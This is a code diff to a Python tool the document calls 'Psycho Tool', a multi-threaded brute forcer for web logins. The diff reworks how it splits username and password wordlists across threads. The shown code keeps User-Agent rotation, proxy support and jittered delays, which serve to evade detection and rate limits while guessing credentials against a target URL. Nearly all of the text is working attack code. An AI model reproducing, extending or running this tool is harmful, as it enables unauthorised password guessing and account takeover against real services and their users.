@@ -9,8 +9,8 @@ import threading
 import random
 from urllib.parse import parse_qs
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from itertools import product, islice
 import os
+import math
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ---------- Color codes (unchanged) ----------
@@ -168,7 +168,7 @@ def load_user_agents(ua_file=None):
     print_info(f"Using {len(builtin)} built-in User-Agents")
     return builtin
 
-# ---------- Worker class (minor changes) ----------
+# ---------- Worker class (improved for efficiency) ----------
 class BruteWorker:
     def __init__(self, config, worker_id):
         self.config = config
@@ -281,82 +281,227 @@ class BruteWorker:
                 print_error(f"[Thread-{self.worker_id}] Error: {e}")
         return False
 
-# ---------- Memory-efficient brute logic ----------
-def generate_credential_pairs(wordlist_target, username, password, users_file, passwords_file):
-    """Generator that yields (user, pass) pairs without loading everything into memory."""
-    if wordlist_target == 'pass':
-        if not username or not passwords_file:
-            raise ValueError("Need --user and --passwords for pass mode")
-        with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as pf:
-            for line in pf:
-                pwd = line.strip()
-                if pwd:
-                    yield (username, pwd)
+# ---------- Memory-efficient brute logic with proper thread division ----------
+def get_file_segment(file_path, start_line, end_line):
+    """Read specific lines from a file without loading entire file into memory"""
+    if not file_path or not os.path.exists(file_path):
+        return []
     
-    elif wordlist_target == 'user':
-        if not password or not users_file:
-            raise ValueError("Need --password and --users for user mode")
-        with open(users_file, 'r', encoding='utf-8', errors='ignore') as uf:
-            for line in uf:
-                usr = line.strip()
-                if usr:
-                    yield (usr, password)
+    lines = []
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        # Skip to start_line
+        for _ in range(start_line):
+            try:
+                next(f)
+            except StopIteration:
+                break
+        
+        # Read lines until end_line
+        line_num = start_line
+        for line in f:
+            if line_num >= end_line:
+                break
+            if line.strip():
+                lines.append(line.strip())
+            line_num += 1
     
-    elif wordlist_target == 'both':
-        if not users_file or not passwords_file:
-            raise ValueError("Need --users and --passwords for both mode")
-        # Use itertools.product to generate combinations lazily
-        def user_gen():
-            with open(users_file, 'r', encoding='utf-8', errors='ignore') as uf:
-                for line in uf:
-                    usr = line.strip()
-                    if usr: yield usr
-        
-        def pass_gen():
-            with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as pf:
-                for line in pf:
-                    pwd = line.strip()
-                    if pwd: yield pwd
-        
-        for combo in product(user_gen(), pass_gen()):
-            yield combo
+    return lines
 
-# Main brute function (now memory-efficient)
+def worker_task_passes(config, worker_id, password_segment):
+    """Worker task for password-only mode"""
+    worker = BruteWorker(config, worker_id)
+    for password in password_segment:
+        if not config['continue_after_success'] and success_storage.has_credentials():
+            break
+        worker.try_credentials(config['username'], password)
+    return worker.attempts
+
+def worker_task_users(config, worker_id, user_segment):
+    """Worker task for user-only mode"""
+    worker = BruteWorker(config, worker_id)
+    for username in user_segment:
+        if not config['continue_after_success'] and success_storage.has_credentials():
+            break
+        worker.try_credentials(username, config['password'])
+    return worker.attempts
+
+def worker_task_both(config, worker_id, user_segment, all_passwords):
+    """Worker task for both mode"""
+    worker = BruteWorker(config, worker_id)
+    for username in user_segment:
+        if not config['continue_after_success'] and success_storage.has_credentials():
+            break
+        for password in all_passwords:
+            if not config['continue_after_success'] and success_storage.has_credentials():
+                break
+            worker.try_credentials(username, password)
+    return worker.attempts
+
 def brute_psycho_threaded(config):
     print_info(f"Starting brute force ({config['wordlist_target']} mode)")
     print_info(f"Threads: {config['threads']}, Base delay: {config['delay_time']}s (with jitter)")
     if config['proxy']: print_info(f"Proxy: {config['proxy']}")
     if config['continue_after_success']: print_info("Continue after success: YES")
     
-    workers = [BruteWorker(config, i+1) for i in range(config['threads'])]
+    total_attempts = 0
     
-    def worker_task():
-        for username, password in generate_credential_pairs(
-            config['wordlist_target'], config['username'], config['password'],
-            config['users_file'], config['passwords_file']
-        ):
-            if not config['continue_after_success'] and success_storage.has_credentials():
-                break
-            # Find a free worker (simple round-robin)
-            worker = workers[threading.current_thread().ident % len(workers)]
-            worker.try_credentials(username, password)
+    if config['wordlist_target'] == 'pass':
+        # Password-only mode
+        if not config['passwords_file'] or not os.path.exists(config['passwords_file']):
+            print_error("Password file not found!")
+            return False
+        
+        # Count total passwords
+        with open(config['passwords_file'], 'r', encoding='utf-8', errors='ignore') as f:
+            total_passwords = sum(1 for _ in f)
+        
+        print_info(f"Total passwords to test: {total_passwords}")
+        
+        if total_passwords == 0:
+            print_error("No passwords in file!")
+            return False
+        
+        # Calculate segment size per thread
+        threads = min(config['threads'], total_passwords)
+        if threads < config['threads']:
+            print_warning(f"Reducing threads from {config['threads']} to {threads} (not enough passwords)")
+        
+        passwords_per_thread = math.ceil(total_passwords / threads)
+        
+        # Create thread tasks
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = []
+            for i in range(threads):
+                start_line = i * passwords_per_thread
+                end_line = min((i + 1) * passwords_per_thread, total_passwords)
+                
+                # Read this thread's segment of passwords
+                password_segment = get_file_segment(config['passwords_file'], start_line, end_line)
+                
+                if password_segment:
+                    future = executor.submit(worker_task_passes, config, i+1, password_segment)
+                    futures.append(future)
+            
+            # Wait for all threads to complete
+            for future in as_completed(futures):
+                try:
+                    attempts = future.result()
+                    total_attempts += attempts
+                except Exception as e:
+                    if config['verbose']:
+                        print_error(f"Thread error: {e}")
     
-    with ThreadPoolExecutor(max_workers=config['threads']) as executor:
-        futures = [executor.submit(worker_task) for _ in range(config['threads'])]
-        for future in as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                if config['verbose']:
-                    print_error(f"Thread error: {e}")
+    elif config['wordlist_target'] == 'user':
+        # User-only mode
+        if not config['users_file'] or not os.path.exists(config['users_file']):
+            print_error("User file not found!")
+            return False
+        
+        # Count total users
+        with open(config['users_file'], 'r', encoding='utf-8', errors='ignore') as f:
+            total_users = sum(1 for _ in f)
+        
+        print_info(f"Total users to test: {total_users}")
+        
+        if total_users == 0:
+            print_error("No users in file!")
+            return False
+        
+        # Calculate segment size per thread
+        threads = min(config['threads'], total_users)
+        if threads < config['threads']:
+            print_warning(f"Reducing threads from {config['threads']} to {threads} (not enough users)")
+        
+        users_per_thread = math.ceil(total_users / threads)
+        
+        # Create thread tasks
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = []
+            for i in range(threads):
+                start_line = i * users_per_thread
+                end_line = min((i + 1) * users_per_thread, total_users)
+                
+                # Read this thread's segment of users
+                user_segment = get_file_segment(config['users_file'], start_line, end_line)
+                
+                if user_segment:
+                    future = executor.submit(worker_task_users, config, i+1, user_segment)
+                    futures.append(future)
+            
+            # Wait for all threads to complete
+            for future in as_completed(futures):
+                try:
+                    attempts = future.result()
+                    total_attempts += attempts
+                except Exception as e:
+                    if config['verbose']:
+                        print_error(f"Thread error: {e}")
     
-    total_attempts = sum(w.attempts for w in workers)
+    elif config['wordlist_target'] == 'both':
+        # Both mode - more complex
+        if not config['users_file'] or not os.path.exists(config['users_file']):
+            print_error("User file not found!")
+            return False
+        if not config['passwords_file'] or not os.path.exists(config['passwords_file']):
+            print_error("Password file not found!")
+            return False
+        
+        # Count users and passwords
+        with open(config['users_file'], 'r', encoding='utf-8', errors='ignore') as f:
+            total_users = sum(1 for _ in f)
+        
+        with open(config['passwords_file'], 'r', encoding='utf-8', errors='ignore') as f:
+            total_passwords = sum(1 for _ in f)
+        
+        total_combinations = total_users * total_passwords
+        print_info(f"Total users: {total_users}, Total passwords: {total_passwords}")
+        print_info(f"Total combinations to test: {total_combinations}")
+        
+        if total_users == 0 or total_passwords == 0:
+            print_error("No users or passwords in files!")
+            return False
+        
+        # For both mode, we divide users among threads
+        threads = min(config['threads'], total_users)
+        if threads < config['threads']:
+            print_warning(f"Reducing threads from {config['threads']} to {threads} (not enough users)")
+        
+        users_per_thread = math.ceil(total_users / threads)
+        
+        # Load all passwords once (they're shared across all threads)
+        all_passwords = []
+        with open(config['passwords_file'], 'r', encoding='utf-8', errors='ignore') as f:
+            all_passwords = [line.strip() for line in f if line.strip()]
+        
+        # Create thread tasks
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = []
+            for i in range(threads):
+                start_line = i * users_per_thread
+                end_line = min((i + 1) * users_per_thread, total_users)
+                
+                # Read this thread's segment of users
+                user_segment = get_file_segment(config['users_file'], start_line, end_line)
+                
+                if user_segment:
+                    future = executor.submit(worker_task_both, config, i+1, user_segment, all_passwords)
+                    futures.append(future)
+            
+            # Wait for all threads to complete
+            for future in as_completed(futures):
+                try:
+                    attempts = future.result()
+                    total_attempts += attempts
+                except Exception as e:
+                    if config['verbose']:
+                        print_error(f"Thread error: {e}")
+    
     print_info(f"Total attempts made: {total_attempts}")
     print_final_summary()
     
     return success_storage.has_credentials()
 
-# ---------- CLI (updated to pass config dict) ----------
+# ---------- CLI (unchanged) ----------
 def main():
     parser = argparse.ArgumentParser(description="Psycho Tool Memory-efficient brute forcer - handles huge wordlists")
     parser.add_argument('--url', required=True)
